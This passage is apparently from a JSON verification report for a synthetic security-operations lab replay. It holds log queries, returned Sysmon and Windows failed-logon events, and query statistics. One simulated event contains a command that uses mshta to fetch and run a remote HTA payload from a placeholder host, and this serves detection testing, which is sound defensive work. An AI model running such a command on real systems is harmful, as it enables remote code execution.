    {
      "case_id": "case-005",
      "kind": "Synthetic multi-source experiment",
      "replay": {
        "labels": {
          "job": "soclab",
          "case_id": "case-005",
          "replay_run": "release-v3-verified",
          "kind": "synthetic",
          "mode": "historical"
        },
        "sent_records": 2511,
        "start_ns": 1788426000000000000,
        "end_ns": 1788429610000000000,
        "delivery": "at-least-once HTTP batches; no exactly-once claim"
      },
      "count_query": "sum(count_over_time({job=\"soclab\",case_id=\"case-005\",replay_run=\"release-v3-verified\",mode=\"historical\"}[3612s]))",
      "count_response": {
        "status": "success",
        "data": {
          "resultType": "vector",
          "result": [
            {
              "metric": {},
              "value": [
                1788429610,
                "2511"
              ]
            }
          ],
          "stats": {
            "summary": {
              "bytesProcessedPerSecond": 22210860,
              "linesProcessedPerSecond": 31849,
              "totalBytesProcessed": 1848028,
              "totalLinesProcessed": 2650,
              "execTime": 0.0832038,
              "queueTime": 0.0013902,
              "subqueries": 0,
              "totalEntriesReturned": 1,
              "splits": 2,
              "shards": 2,
              "totalPostFilterLines": 2650,
              "totalStructuredMetadataBytesProcessed": 26500
            },
            "querier": {
              "store": {
                "totalChunksRef": 2,
                "totalChunksDownloaded": 2,
                "chunksDownloadTime": 1915500,
                "queryReferencedStructuredMetadata": false,
                "queryUsedV2Engine": false,
                "chunk": {
                  "headChunkBytes": 0,
                  "headChunkLines": 0,
                  "decompressedBytes": 1848028,
                  "decompressedLines": 2650,
                  "compressedBytes": 138399,
                  "totalDuplicates": 0,
                  "postFilterLines": 2650,
                  "headChunkStructuredMetadataBytes": 0,
                  "decompressedStructuredMetadataBytes": 26500
                },
                "chunkRefsFetchTime": 8658100,
                "congestionControlLatency": 0,
                "pipelineWrapperFilteredLines": 0,
                "dataobj": {
                  "prePredicateDecompressedRows": 0,
                  "prePredicateDecompressedBytes": 0,
                  "prePredicateDecompressedStructuredMetadataBytes": 0,
                  "postPredicateRows": 0,
                  "postPredicateDecompressedBytes": 0,
                  "postPredicateStructuredMetadataBytes": 0,
                  "postFilterRows": 0,
                  "pagesScanned": 0,
                  "pagesDownloaded": 0,
                  "pagesDownloadedBytes": 0,
                  "pageBatches": 0,
                  "totalRowsAvailable": 0,
                  "totalPageDownloadTime": 0
                }
              },
              "querierExecTime": 0.0867987
            },
            "ingester": {
              "totalReached": 2,
              "totalChunksMatched": 0,
              "totalBatches": 2,
              "totalLinesSent": 0,
              "store": {
                "totalChunksRef": 0,
                "totalChunksDownloaded": 0,
                "chunksDownloadTime": 0,
                "queryReferencedStructuredMetadata": false,
                "queryUsedV2Engine": false,
                "chunk": {
                  "headChunkBytes": 0,
                  "headChunkLines": 0,
                  "decompressedBytes": 0,
                  "decompressedLines": 0,
                  "compressedBytes": 0,
                  "totalDuplicates": 0,
                  "postFilterLines": 0,
                  "headChunkStructuredMetadataBytes": 0,
                  "decompressedStructuredMetadataBytes": 0
                },
                "chunkRefsFetchTime": 0,
                "congestionControlLatency": 0,
                "pipelineWrapperFilteredLines": 0,
                "dataobj": {
                  "prePredicateDecompressedRows": 0,
                  "prePredicateDecompressedBytes": 0,
                  "prePredicateDecompressedStructuredMetadataBytes": 0,
                  "postPredicateRows": 0,
                  "postPredicateDecompressedBytes": 0,
                  "postPredicateStructuredMetadataBytes": 0,
                  "postFilterRows": 0,
                  "pagesScanned": 0,
                  "pagesDownloaded": 0,
                  "pagesDownloadedBytes": 0,
                  "pageBatches": 0,
                  "totalRowsAvailable": 0,
                  "totalPageDownloadTime": 0
                }
              },
              "recvWaitTime": 0.0035082
            },
            "cache": {
              "chunk": {
                "entriesFound": 2,
                "entriesRequested": 2,
                "entriesStored": 0,
                "bytesReceived": 260158,
                "bytesSent": 0,
                "requests": 4,
                "downloadTime": 0,
                "queryLengthServed": 0
              },
              "index": {
                "entriesFound": 0,
                "entriesRequested": 0,
                "entriesStored": 0,
                "bytesReceived": 0,
                "bytesSent": 0,
                "requests": 0,
                "downloadTime": 0,
                "queryLengthServed": 0
              },
              "result": {
                "entriesFound": 0,
                "entriesRequested": 0,
                "entriesStored": 0,
                "bytesReceived": 0,
                "bytesSent": 0,
                "requests": 0,
                "downloadTime": 0,
                "queryLengthServed": 0
              },
              "statsResult": {
                "entriesFound": 0,
                "entriesRequested": 0,
                "entriesStored": 0,
                "bytesReceived": 0,
                "bytesSent": 0,
                "requests": 0,
                "downloadTime": 0,
                "queryLengthServed": 0
              },
              "volumeResult": {
                "entriesFound": 0,
                "entriesRequested": 0,
                "entriesStored": 0,
                "bytesReceived": 0,
                "bytesSent": 0,
                "requests": 0,
                "downloadTime": 0,
                "queryLengthServed": 0
              },
              "seriesResult": {
                "entriesFound": 0,
                "entriesRequested": 0,
                "entriesStored": 0,
                "bytesReceived": 0,
                "bytesSent": 0,
                "requests": 0,
                "downloadTime": 0,
                "queryLengthServed": 0
              },
              "labelResult": {
                "entriesFound": 0,
                "entriesRequested": 0,
                "entriesStored": 0,
                "bytesReceived": 0,
                "bytesSent": 0,
                "requests": 0,
                "downloadTime": 0,
                "queryLengthServed": 0
              },
              "instantMetricResult": {
                "entriesFound": 0,
                "entriesRequested": 0,
                "entriesStored": 0,
                "bytesReceived": 0,
                "bytesSent": 0,
                "requests": 0,
                "downloadTime": 0,
                "queryLengthServed": 0
              }
            },
            "index": {
              "totalChunks": 0,
              "postFilterChunks": 0,
              "shardsDuration": 0,
              "usedBloomFilters": false,
              "totalStreams": 0,
              "chunkRefsLookupTime": 0,
              "bloomFilterTime": 0
            }
          }
        }
      },
      "uid_query": "{job=\"soclab\",case_id=\"case-005\",replay_run=\"release-v3-verified\",mode=\"historical\"} | json | event_uid = \"bc8ba65d53680a499a7c1888f19ee64d01ac8105bcaff433b3c16a8ea9674ff6\"",
      "uid_response": {
        "status": "success",
        "data": {
          "resultType": "streams",
          "result": [
            {
              "stream": {
                "case_id": "case-005",
                "channel": "Microsoft-Windows-Sysmon/Operational",
                "command_line": "cmd.exe /c mshta.exe https://payload.example.invalid/stage.hta",
                "destination_ip": "",
                "event_data_CommandLine": "cmd.exe /c mshta.exe https://payload.example.invalid/stage.hta",
                "event_data_Image": "C:\\Windows\\System32\\cmd.exe",
                "event_data_LogonGuid": "{9e175872-74a3-5c6d-882c-524c742cb7dc}",
                "event_data_LogonId": "0x42",
                "event_data_ParentProcessGuid": "{00000000-0000-0000-0000-000000000000}",
                "event_data_ProcessGuid": "{ac333bb9-aa2e-5082-938a-2c0dee8262a1}",
                "event_data_ProcessId": "4000",
                "event_data_User": "LAB\\analyst.lab",
                "event_id": "1",
                "event_uid": "bc8ba65d53680a499a7c1888f19ee64d01ac8105bcaff433b3c16a8ea9674ff6",
                "host": "WS-CHAIN-LAB",
                "image": "C:\\Windows\\System32\\cmd.exe",
                "ip": "",
                "job": "soclab",
                "kind": "synthetic",
                "logon_type": "",
                "mode": "historical",
                "original_timestamp": "2026-09-03T10:00:06.000000Z",
                "parent_guid": "{00000000-0000-0000-0000-000000000000}",
                "process_guid": "{ac333bb9-aa2e-5082-938a-2c0dee8262a1}",
                "provider": "Microsoft-Windows-Sysmon",
                "record_id": "106",
                "replay_mode": "historical",
                "replay_run": "release-v3-verified",
                "script_block": "",
                "service_name": "soclab",
                "source_line": "1",
                "source_sha256": "8fadc59ed82f68fde96b8ecb96c2225ae46f0e79aea1afc44be0f72e0dab823d",
                "target_user": "",
                "user": "LAB\\analyst.lab"
              },
              "values": [
                [
                  "1788429606000000000",
                  "{\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"command_line\":\"cmd.exe /c mshta.exe https://payload.example.invalid/stage.hta\",\"destination_ip\":\"\",\"event_data\":{\"CommandLine\":\"cmd.exe /c mshta.exe https://payload.example.invalid/stage.hta\",\"Image\":\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"LogonGuid\":\"{9e175872-74a3-5c6d-882c-524c742cb7dc}\",\"LogonId\":\"0x42\",\"ParentProcessGuid\":\"{00000000-0000-0000-0000-000000000000}\",\"ProcessGuid\":\"{ac333bb9-aa2e-5082-938a-2c0dee8262a1}\",\"ProcessId\":\"4000\",\"User\":\"LAB\\\\analyst.lab\"},\"event_id\":1,\"event_uid\":\"bc8ba65d53680a499a7c1888f19ee64d01ac8105bcaff433b3c16a8ea9674ff6\",\"host\":\"WS-CHAIN-LAB\",\"image\":\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"ip\":\"\",\"logon_type\":\"\",\"original_timestamp\":\"2026-09-03T10:00:06.000000Z\",\"parent_guid\":\"{00000000-0000-0000-0000-000000000000}\",\"process_guid\":\"{ac333bb9-aa2e-5082-938a-2c0dee8262a1}\",\"provider\":\"Microsoft-Windows-Sysmon\",\"record_id\":106,\"replay_mode\":\"historical\",\"script_block\":\"\",\"source_line\":1,\"source_sha256\":\"8fadc59ed82f68fde96b8ecb96c2225ae46f0e79aea1afc44be0f72e0dab823d\",\"target_user\":\"\",\"user\":\"LAB\\\\analyst.lab\"}"
                ]
              ]
            }
          ],
          "stats": {
            "summary": {
              "bytesProcessedPerSecond": 68407294,
              "linesProcessedPerSecond": 98098,
              "totalBytesProcessed": 1751001,
              "totalLinesProcessed": 2511,
              "execTime": 0.025597,
              "queueTime": 0,
              "subqueries": 0,
              "totalEntriesReturned": 1,
              "splits": 0,
              "shards": 0,
              "totalPostFilterLines": 1,
              "totalStructuredMetadataBytesProcessed": 25110
            },
            "querier": {
              "store": {
                "totalChunksRef": 1,
                "totalChunksDownloaded": 1,
                "chunksDownloadTime": 578200,
                "queryReferencedStructuredMetadata": false,
                "queryUsedV2Engine": false,
                "chunk": {
                  "headChunkBytes": 0,
                  "headChunkLines": 0,
                  "decompressedBytes": 1751001,
                  "decompressedLines": 2511,
                  "compressedBytes": 129487,
                  "totalDuplicates": 0,
                  "postFilterLines": 1,
                  "headChunkStructuredMetadataBytes": 0,
                  "decompressedStructuredMetadataBytes": 25110
                },
                "chunkRefsFetchTime": 1552000,
                "congestionControlLatency": 0,
                "pipelineWrapperFilteredLines": 0,
                "dataobj": {
                  "prePredicateDecompressedRows": 0,
                  "prePredicateDecompressedBytes": 0,
                  "prePredicateDecompressedStructuredMetadataBytes": 0,
                  "postPredicateRows": 0,
                  "postPredicateDecompressedBytes": 0,
                  "postPredicateStructuredMetadataBytes": 0,
                  "postFilterRows": 0,
                  "pagesScanned": 0,
                  "pagesDownloaded": 0,
                  "pagesDownloadedBytes": 0,
                  "pageBatches": 0,
                  "totalRowsAvailable": 0,
                  "totalPageDownloadTime": 0
                }
              },
              "querierExecTime": 0.022725
            },
            "ingester": {
              "totalReached": 1,
              "totalChunksMatched": 0,
              "totalBatches": 1,
              "totalLinesSent": 0,
              "store": {
                "totalChunksRef": 0,
                "totalChunksDownloaded": 0,
                "chunksDownloadTime": 0,
                "queryReferencedStructuredMetadata": false,
                "queryUsedV2Engine": false,
                "chunk": {
                  "headChunkBytes": 0,
                  "headChunkLines": 0,
                  "decompressedBytes": 0,
                  "decompressedLines": 0,
                  "compressedBytes": 0,
                  "totalDuplicates": 0,
                  "postFilterLines": 0,
                  "headChunkStructuredMetadataBytes": 0,
                  "decompressedStructuredMetadataBytes": 0
                },
                "chunkRefsFetchTime": 0,
                "congestionControlLatency": 0,
                "pipelineWrapperFilteredLines": 0,
                "dataobj": {
                  "prePredicateDecompressedRows": 0,
                  "prePredicateDecompressedBytes": 0,
                  "prePredicateDecompressedStructuredMetadataBytes": 0,
                  "postPredicateRows": 0,
                  "postPredicateDecompressedBytes": 0,
                  "postPredicateStructuredMetadataBytes": 0,
                  "postFilterRows": 0,
                  "pagesScanned": 0,
                  "pagesDownloaded": 0,
                  "pagesDownloadedBytes": 0,
                  "pageBatches": 0,
                  "totalRowsAvailable": 0,
                  "totalPageDownloadTime": 0
                }
              }
            },
            "cache": {
              "chunk": {
                "entriesFound": 1,
                "entriesRequested": 1,
                "entriesStored": 0,
                "bytesReceived": 130079,
                "bytesSent": 0,
                "requests": 2,
                "downloadTime": 0,
                "queryLengthServed": 0
              },
              "index": {
                "entriesFound": 0,
                "entriesRequested": 0,
                "entriesStored": 0,
                "bytesReceived": 0,
                "bytesSent": 0,
                "requests": 0,
                "downloadTime": 0,
                "queryLengthServed": 0
              },
              "result": {
                "entriesFound": 0,
                "entriesRequested": 0,
                "entriesStored": 0,
                "bytesReceived": 0,
                "bytesSent": 0,
                "requests": 0,
                "downloadTime": 0,
                "queryLengthServed": 0
              },
              "statsResult": {
                "entriesFound": 0,
                "entriesRequested": 0,
                "entriesStored": 0,
                "bytesReceived": 0,
                "bytesSent": 0,
                "requests": 0,
                "downloadTime": 0,
                "queryLengthServed": 0
              },
              "volumeResult": {
                "entriesFound": 0,
                "entriesRequested": 0,
                "entriesStored": 0,
                "bytesReceived": 0,
                "bytesSent": 0,
                "requests": 0,
                "downloadTime": 0,
                "queryLengthServed": 0
              },
              "seriesResult": {
                "entriesFound": 0,
                "entriesRequested": 0,
                "entriesStored": 0,
                "bytesReceived": 0,
                "bytesSent": 0,
                "requests": 0,
                "downloadTime": 0,
                "queryLengthServed": 0
              },
              "labelResult": {
                "entriesFound": 0,
                "entriesRequested": 0,
                "entriesStored": 0,
                "bytesReceived": 0,
                "bytesSent": 0,
                "requests": 0,
                "downloadTime": 0,
                "queryLengthServed": 0
              },
              "instantMetricResult": {
                "entriesFound": 0,
                "entriesRequested": 0,
                "entriesStored": 0,
                "bytesReceived": 0,
                "bytesSent": 0,
                "requests": 0,
                "downloadTime": 0,
                "queryLengthServed": 0
              }
            },
            "index": {
              "totalChunks": 0,
              "postFilterChunks": 0,
              "shardsDuration": 0,
              "usedBloomFilters": false,
              "totalStreams": 0,
              "chunkRefsLookupTime": 0,
              "bloomFilterTime": 0
            }
          }
        }
      },
      "expected_records": 2511,
      "observed_records": 2511
    }
  ],
  "dashboard_replay": {
    "labels": {
      "job": "soclab",
      "case_id": "case-005",
      "replay_run": "release-v3-verified",
      "kind": "synthetic",
      "mode": "replay_now"
    },
    "sent_records": 11,
    "start_ns": 1791127034091234400,
    "end_ns": 1791127034091244400,
    "delivery": "at-least-once HTTP batches; no exactly-once claim"
  },
  "dashboard_queries": [
    {
      "event_id": 4625,
      "query": "{job=\"soclab\",case_id=\"case-005\",replay_run=\"release-v3-verified\",mode=\"replay_now\"} | json | event_id = 4625",
      "expected": 5,
      "observed": 5,
      "response": {
        "status": "success",
        "data": {
          "resultType": "streams",
          "result": [
            {
              "stream": {
                "case_id": "case-005",
                "channel": "Security",
                "command_line": "",
                "destination_ip": "",
                "event_data_IpAddress": "192.0.2.20",
                "event_data_LogonType": "3",
                "event_data_Status": "0xc000006d",
                "event_data_SubStatus": "0xc000006a",
                "event_data_TargetDomainName": "LAB",
                "event_data_TargetUserName": "analyst.lab",
                "event_id": "4625",
                "event_uid": "34708f039f64e9944eb390107df937531d3e285273375912e02b0269da147a2a",
                "host": "WS-CHAIN-LAB",
                "image": "",
                "ip": "192.0.2.20",
                "job": "soclab",
                "kind": "synthetic",
                "logon_type": "3",
                "mode": "replay_now",
                "original_timestamp": "2026-09-03T10:00:01.000000Z",
                "parent_guid": "",
                "process_guid": "",
                "provider": "Microsoft-Windows-Security-Auditing",
                "record_id": "101",
                "replay_mode": "replay_now",
                "replay_run": "release-v3-verified",
                "script_block": "",
                "service_name": "soclab",
                "source_line": "2",
                "source_sha256": "c091ae65dc770ccbb76adbe62b678d768ad5e1c137e9849917619423876b4c53",
                "target_user": "analyst.lab",
                "user": ""
              },
              "values": [
                [
                  "1791127034091235400",
                  "{\"channel\":\"Security\",\"command_line\":\"\",\"destination_ip\":\"\",\"event_data\":{\"IpAddress\":\"192.0.2.20\",\"LogonType\":\"3\",\"Status\":\"0xc000006d\",\"SubStatus\":\"0xc000006a\",\"TargetDomainName\":\"LAB\",\"TargetUserName\":\"analyst.lab\"},\"event_id\":4625,\"event_uid\":\"34708f039f64e9944eb390107df937531d3e285273375912e02b0269da147a2a\",\"host\":\"WS-CHAIN-LAB\",\"image\":\"\",\"ip\":\"192.0.2.20\",\"logon_type\":\"3\",\"original_timestamp\":\"2026-09-03T10:00:01.000000Z\",\"parent_guid\":\"\",\"process_guid\":\"\",\"provider\":\"Microsoft-Windows-Security-Auditing\",\"record_id\":101,\"replay_mode\":\"replay_now\",\"script_block\":\"\",\"source_line\":2,\"source_sha256\":\"c091ae65dc770ccbb76adbe62b678d768ad5e1c137e9849917619423876b4c53\",\"target_user\":\"analyst.lab\",\"user\":\"\"}"
                ]
              ]
            },
            {
              "stream": {
                "case_id": "case-005",
                "channel": "Security",
                "command_line": "",
                "destination_ip": "",
                "event_data_IpAddress": "192.0.2.20",
                "event_data_LogonType": "3",
                "event_data_Status": "0xc000006d",
                "event_data_SubStatus": "0xc000006a",
                "event_data_TargetDomainName": "LAB",
                "event_data_TargetUserName": "analyst.lab",
                "event_id": "4625",
                "event_uid": "adcb4a75e805e21d7cf57b3bf5aa50b06f592d174ea00c74e091138ff2b6a1b4",
                "host": "WS-CHAIN-LAB",
                "image": "",
                "ip": "192.0.2.20",
                "job": "soclab",
                "kind": "synthetic",
                "logon_type": "3",
                "mode": "replay_now",
                "original_timestamp": "2026-09-03T10:00:03.000000Z",
                "parent_guid": "",
                "process_guid": "",
                "provider": "Microsoft-Windows-Security-Auditing",
                "record_id": "103",
                "replay_mode": "replay_now",
                "replay_run": "release-v3-verified",
                "script_block": "",
                "service_name": "soclab",
                "source_line": "4",
                "source_sha256": "c091ae65dc770ccbb76adbe62b678d768ad5e1c137e9849917619423876b4c53",
                "target_user": "analyst.lab",
                "user": ""
              },
              "values": [
                [
                  "1791127034091237400",
                  "{\"channel\":\"Security\",\"command_line\":\"\",\"destination_ip\":\"\",\"event_data\":{\"IpAddress\":\"192.0.2.20\",\"LogonType\":\"3\",\"Status\":\"0xc000006d\",\"SubStatus\":\"0xc000006a\",\"TargetDomainName\":\"LAB\",\"TargetUserName\":\"analyst.lab\"},\"event_id\":4625,\"event_uid\":\"adcb4a75e805e21d7cf57b3bf5aa50b06f592d174ea00c74e091138ff2b6a1b4\",\"host\":\"WS-CHAIN-LAB\",\"image\":\"\",\"ip\":\"192.0.2.20\",\"logon_type\":\"3\",\"original_timestamp\":\"2026-09-03T10:00:03.000000Z\",\"parent_guid\":\"\",\"process_guid\":\"\",\"provider\":\"Microsoft-Windows-Security-Auditing\",\"record_id\":103,\"replay_mode\":\"replay_now\",\"script_block\":\"\",\"source_line\":4,\"source_sha256\":\"c091ae65dc770ccbb76adbe62b678d768ad5e1c137e9849917619423876b4c53\",\"target_user\":\"analyst.lab\",\"user\":\"\"}"
                ]
              ]
            },
            {
              "stream": {
                "case_id": "case-005",
                "channel": "Security",
                "command_line": "",
                "destination_ip": "",
                "event_data_IpAddress": "192.0.2.20",
                "event_data_LogonType": "3",
                "event_data_Status": "0xc000006d",
                "event_data_SubStatus": "0xc000006a",
                "event_data_TargetDomainName": "LAB",
                "event_data_TargetUserName": "analyst.lab",
                "event_id": "4625",
                "event_uid": "d9ea1507c860ebcb6c49e86da3543f23477c6b9dced71e5585efee17c16ea3d7",
                "host": "WS-CHAIN-LAB",
                "image": "",
                "ip": "192.0.2.20",
                "job": "soclab",
                "kind": "synthetic",
                "logon_type": "3",
                "mode": "replay_now",
                "original_timestamp": "2026-09-03T10:00:04.000000Z",
                "parent_guid": "",
                "process_guid": "",
                "provider": "Microsoft-Windows-Security-Auditing",
                "record_id": "104",
                "replay_mode": "replay_now",
                "replay_run": "release-v3-verified",
                "script_block": "",
                "service_name": "soclab",
                "source_line": "5",
                "source_sha256": "c091ae65dc770ccbb76adbe62b678d768ad5e1c137e9849917619423876b4c53",
                "target_user": "analyst.lab",
                "user": ""
              },
              "values": [
                [
                  "1791127034091238400",
                  "{\"channel\":\"Security\",\"command_line\":\"\",\"destination_ip\":\"\",\"event_data\":{\"IpAddress\":\"192.0.2.20\",\"LogonType\":\"3\",\"Status\":\"0xc000006d\",\"SubStatus\":\"0xc000006a\",\"TargetDomainName\":\"LAB\",\"TargetUserName\":\"analyst.lab\"},\"event_id\":4625,\"event_uid\":\"d9ea1507c860ebcb6c49e86da3543f23477c6b9dced71e5585efee17c16ea3d7\",\"host\":\"WS-CHAIN-LAB\",\"image\":\"\",\"ip\":\"192.0.2.20\",\"logon_type\":\"3\",\"original_timestamp\":\"2026-09-03T10:00:04.000000Z\",\"parent_guid\":\"\",\"process_guid\":\"\",\"provider\":\"Microsoft-Windows-Security-Auditing\",\"record_id\":104,\"replay_mode\":\"replay_now\",\"script_block\":\"\",\"source_line\":5,\"source_sha256\":\"c091ae65dc770ccbb76adbe62b678d768ad5e1c137e9849917619423876b4c53\",\"target_user\":\"analyst.lab\",\"user\":\"\"}"
                ]
              ]
            },
            {
              "stream": {
                "case_id": "case-005",
                "channel": "Security",
                "command_line": "",
                "destination_ip": "",
                "event_data_IpAddress": "192.0.2.20",
                "event_data_LogonType": "3",
                "event_data_Status": "0xc000006d",
                "event_data_SubStatus": "0xc000006a",
                "event_data_TargetDomainName": "LAB",
                "event_data_TargetUserName": "analyst.lab",
                "event_id": "4625",
                "event_uid": "f4306533550f55d80cf9878e653b252eae2a2cc0dd71233f2fcebd92be932be3",
                "host": "WS-CHAIN-LAB",
                "image": "",
                "ip": "192.0.2.20",
                "job": "soclab",
                "kind": "synthetic",
                "logon_type": "3",
                "mode": "replay_now",
                "original_timestamp": "2026-09-03T10:00:00.000000Z",
                "parent_guid": "",
                "process_guid": "",
                "provider": "Microsoft-Windows-Security-Auditing",
                "record_id": "100",
                "replay_mode": "replay_now",
                "replay_run": "release-v3-verified",
                "script_block": "",
                "service_name": "soclab",
                "source_line": "1",
                "source_sha256": "c091ae65dc770ccbb76adbe62b678d768ad5e1c137e9849917619423876b4c53",
                "target_user": "analyst.lab",
                "user": ""
              },
              "values": [
                [
                  "1791127034091234400",
                  "{\"channel\":\"Security\",\"command_line\":\"\",\"destination_ip\":\"\",\"event_data\":{\"IpAddress\":\"192.0.2.20\",\"LogonType\":\"3\",\"Status\":\"0xc000006d\",\"SubStatus\":\"0xc000006a\",\"TargetDomainName\":\"LAB\",\"TargetUserName\":\"analyst.lab\"},\"event_id\":4625,\"event_uid\":\"f4306533550f55d80cf9878e653b252eae2a2cc0dd71233f2fcebd92be932be3\",\"host\":\"WS-CHAIN-LAB\",\"image\":\"\",\"ip\":\"192.0.2.20\",\"logon_type\":\"3\",\"original_timestamp\":\"2026-09-03T10:00:00.000000Z\",\"parent_guid\":\"\",\"process_guid\":\"\",\"provider\":\"Microsoft-Windows-Security-Auditing\",\"record_id\":100,\"replay_mode\":\"replay_now\",\"script_block\":\"\",\"source_line\":1,\"source_sha256\":\"c091ae65dc770ccbb76adbe62b678d768ad5e1c137e9849917619423876b4c53\",\"target_user\":\"analyst.lab\",\"user\":\"\"}"
                ]
              ]
            },
            {
              "stream": {
                "case_id": "case-005",
                "channel": "Security",
                "command_line": "",
                "destination_ip": "",
                "event_data_IpAddress": "192.0.2.20",
                "event_data_LogonType": "3",
                "event_data_Status": "0xc000006d",
                "event_data_SubStatus": "0xc000006a",
                "event_data_TargetDomainName": "LAB",
                "event_data_TargetUserName": "analyst.lab",
                "event_id": "4625",
                "event_uid": "f6885debff92028f9dd4d36fc2ed0cc080af499f6031bc01d5cf0cb7673d51ed",
                "host": "WS-CHAIN-LAB",
                "image": "",
                "ip": "192.0.2.20",
                "job": "soclab",
                "kind": "synthetic",
                "logon_type": "3",
                "mode": "replay_now",
                "original_timestamp": "2026-09-03T10:00:02.000000Z",
                "parent_guid": "",
                "process_guid": "",
                "provider": "Microsoft-Windows-Security-Auditing",
                "record_id": "102",
                "replay_mode": "replay_now",
                "replay_run": "release-v3-verified",
                "script_block": "",
                "service_name": "soclab",
                "source_line": "3",
                "source_sha256": "c091ae65dc770ccbb76adbe62b678d768ad5e1c137e9849917619423876b4c53",
                "target_user": "analyst.lab",
                "user": ""
              },
              "values": [
                [
                  "1791127034091236400",
                  "{\"channel\":\"Security\",\"command_line\":\"\",\"destination_ip\":\"\",\"event_data\":{\"IpAddress\":\"192.0.2.20\",\"LogonType\":\"3\",\"Status\":\"0xc000006d\",\"SubStatus\":\"0xc000006a\",\"TargetDomainName\":\"LAB\",\"TargetUserName\":\"analyst.lab\"},\"event_id\":4625,\"event_uid\":\"f6885debff92028f9dd4d36fc2ed0cc080af499f6031bc01d5cf0cb7673d51ed\",\"host\":\"WS-CHAIN-LAB\",\"image\":\"\",\"ip\":\"192.0.2.20\",\"logon_type\":\"3\",\"original_timestamp\":\"2026-09-03T10:00:02.000000Z\",\"parent_guid\":\"\",\"process_guid\":\"\",\"provider\":\"Microsoft-Windows-Security-Auditing\",\"record_id\":102,\"replay_mode\":\"replay_now\",\"script_block\":\"\",\"source_line\":3,\"source_sha256\":\"c091ae65dc770ccbb76adbe62b678d768ad5e1c137e9849917619423876b4c53\",\"target_user\":\"analyst.lab\",\"user\":\"\"}"
                ]
              ]
            }
          ],
          "stats": {
            "summary": {
              "bytesProcessedPerSecond": 1872028,
              "linesProcessedPerSecond": 2143,
              "totalBytesProcessed": 9608,
              "totalLinesProcessed": 11,
              "execTime": 0.005132,
              "queueTime": 0.001009,
              "subqueries": 0,
              "totalEntriesReturned": 5,
              "splits": 0,
              "shards": 0,
              "totalPostFilterLines": 5,
              "totalStructuredMetadataBytesProcessed": 110
            },
            "querier": {
              "store": {
                "totalChunksRef": 1,
                "totalChunksDownloaded": 1,
                "chunksDownloadTime": 0,
                "queryReferencedStructuredMetadata": false,
                "queryUsedV2Engine": false,
                "chunk": {
                  "headChunkBytes": 0,
                  "headChunkLines": 0,
                  "decompressedBytes": 9608,
                  "decompressedLines": 11,
                  "compressedBytes": 1786,
                  "totalDuplicates": 0,
                  "postFilterLines": 5,
                  "headChunkStructuredMetadataBytes": 0,
                  "decompressedStructuredMetadataBytes": 110
                },
                "chunkRefsFetchTime": 0,
                "congestionControlLatency": 0,
                "pipelineWrapperFilteredLines": 0,
                "dataobj": {
                  "prePredicateDecompressedRows": 0,
                  "prePredicateDecompressedBytes": 0,
                  "prePredicateDecompressedStructuredMetadataBytes": 0,
                  "postPredicateRows": 0,
                  "postPredicateDecompressedBytes": 0,
                  "postPredicateStructuredMetadataBytes": 0,
                  "postFilterRows": 0,
                  "pagesScanned": 0,
                  "pagesDownloaded": 0,
                  "pagesDownloadedBytes": 0,
                  "pageBatches": 0,
                  "totalRowsAvailable": 0,
                  "totalPageDownloadTime": 0
                }
              },
              "querierExecTime": 0.003054
            },
            "ingester": {
              "totalReached": 1,
              "totalChunksMatched": 0,
              "totalBatches": 1,
              "totalLinesSent": 0,
              "store": {
                "totalChunksRef": 0,
                "totalChunksDownloaded": 0,
                "chunksDownloadTime": 0,
                "queryReferencedStructuredMetadata": false,
                "queryUsedV2Engine": false,
                "chunk": {
                  "headChunkBytes": 0,
                  "headChunkLines": 0,
                  "decompressedBytes": 0,
                  "decompressedLines": 0,
                  "compressedBytes": 0,
                  "totalDuplicates": 0,
                  "postFilterLines": 0,
                  "headChunkStructuredMetadataBytes": 0,
                  "decompressedStructuredMetadataBytes": 0
                },
                "chunkRefsFetchTime": 0,
                "congestionControlLatency": 0,
                "pipelineWrapperFilteredLines": 0,
                "dataobj": {
                  "prePredicateDecompressedRows": 0,
                  "prePredicateDecompressedBytes": 0,
                  "prePredicateDecompressedStructuredMetadataBytes": 0,
                  "postPredicateRows": 0,
                  "postPredicateDecompressedBytes": 0,
                  "postPredicateStructuredMetadataBytes": 0,
                  "postFilterRows": 0,
                  "pagesScanned": 0,
                  "pagesDownloaded": 0,
                  "pagesDownloadedBytes": 0,
                  "pageBatches": 0,
                  "totalRowsAvailable": 0,
                  "totalPageDownloadTime": 0
                }
              },
              "recvWaitTime": 0.000992
            },
            "cache": {
              "chunk": {
                "entriesFound": 1,
                "entriesRequested": 1,
                "entriesStored": 0,
                "bytesReceived": 2186,
                "bytesSent": 0,
                "requests": 2,
                "downloadTime": 0,
                "queryLengthServed": 0
              },
              "index": {
                "entriesFound": 0,
                "entriesRequested": 0,
                "entriesStored": 0,
                "bytesReceived": 0,
                "bytesSent": 0,
                "requests": 0,
                "downloadTime": 0,
                "queryLengthServed": 0
              },
              "result": {
                "entriesFound": 0,
                "entriesRequested": 0,
                "entriesStored": 0,
                "bytesReceived": 0,
                "bytesSent": 0,
                "requests": 0,
                "downloadTime": 0,
                "queryLengthServed": 0
              },
              "statsResult": {
                "entriesFound": 0,
                "entriesRequested": 0,
                "entriesStored": 0,
                "bytesReceived": 0,
                "bytesSent": 0,
                "requests": 0,
                "downloadTime": 0,
                "queryLengthServed": 0
              },
              "volumeResult": {
                "entriesFound": 0,
                "entriesRequested": 0,
                "entriesStored": 0,
                "bytesReceived": 0,
                "bytesSent": 0,
                "requests": 0,
                "downloadTime": 0,
                "queryLengthServed": 0
              },
              "seriesResult": {
                "entriesFound": 0,
                "entriesRequested": 0,
                "entriesStored": 0,
                "bytesReceived": 0,
                "bytesSent": 0,
                "requests": 0,
                "downloadTime": 0,
                "queryLengthServed": 0
              },
              "labelResult": {
                "entriesFound": 0,
                "entriesRequested": 0,
                "entriesStored": 0,
                "bytesReceived": 0,
                "bytesSent": 0,
                "requests": 0,
                "downloadTime": 0,
                "queryLengthServed": 0
              },
              "instantMetricResult": {
                "entriesFound": 0,
                "entriesRequested": 0,
                "entriesStored": 0,
                "bytesReceived": 0,
                "bytesSent": 0,
                "requests": 0,
                "downloadTime": 0,
                "queryLengthServed": 0
              }
            },
            "index": {
              "totalChunks": 0,
              "postFilterChunks": 0,
              "shardsDuration": 0,
              "usedBloomFilters": false,
              "totalStreams": 0,
              "chunkRefsLookupTime": 0,
              "bloomFilterTime": 0
            }
          }
        }
      }
    },
    {
      "event_id": 4624,
